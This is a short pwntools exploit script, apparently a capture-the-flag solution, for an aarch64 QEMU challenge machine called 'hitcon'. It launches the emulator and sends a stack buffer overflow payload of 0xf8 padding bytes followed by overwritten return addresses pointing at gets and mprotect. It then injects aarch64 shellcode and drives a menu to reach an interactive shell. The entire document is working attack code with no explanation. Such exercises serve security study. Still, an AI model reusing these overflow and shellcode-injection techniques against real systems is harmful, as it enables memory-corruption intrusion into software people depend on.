from pwn import *
context(arch='aarch64',endian='little')
  
cmd  = "cd ../../../run ;"
cmd += "./qemu-system-aarch64 -nographic -machine hitcon -cpu hitcon "
cmd += "-bios ./bios.bin -monitor /dev/null 2>/dev/null -serial null "

io = process(["/bin/sh","-c",cmd])

mprotect = 0x401B68
gets     = 0x4019B0
sc_addr  = 0x7ffeffffd008

shellcode = '''
ldr x1, =0x400104
blr x1
'''
shellcode = asm(shellcode)

io.sendlineafter(b"cmd> ",b"0")
io.sendlineafter(b"index: ",b'a'*0xf8+p64(sc_addr)+p64(gets)+p64(mprotect))
io.sendline(b'a'*8+shellcode)

io.sendlineafter(b"cmd> ",b"1")
io.sendlineafter(b"index: ",b'4096')
io.sendlineafter(b"key: ",b'12345')

io.sendlineafter(b"cmd> ",b"-1")
io.sendlineafter(b"index: ",b'1')

io.interactive()